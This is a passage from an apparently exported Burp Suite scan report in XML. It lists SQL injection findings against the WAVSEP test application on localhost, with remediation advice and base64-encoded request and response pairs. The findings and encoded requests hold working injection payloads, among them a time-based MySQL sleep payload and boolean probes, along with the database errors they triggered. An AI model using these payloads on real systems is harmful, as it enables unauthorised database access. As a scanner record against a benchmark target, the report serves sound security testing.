wdXQnJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDMtSW5qZWN0aW9uSW5DYWxjLVN0cmluZy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTgNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UwMy1JbmplY3Rpb25JbkNhbGMtU3RyaW5nLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp1c2VybmFtZT10ZXN0aW5wdXQnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4043776277231348736</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTQ3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJ3Rlc3RpbnB1dCcnIFdIRVJFIG1zZ2lkPTEnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDQtSW5qZWN0aW9uSW5VcGRhdGUtU3RyaW5nLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>85325947507786752</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>53949005 or 2799=02799</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTYxDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMS0wMScnIEFORCB1c2VySWQ9MScgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4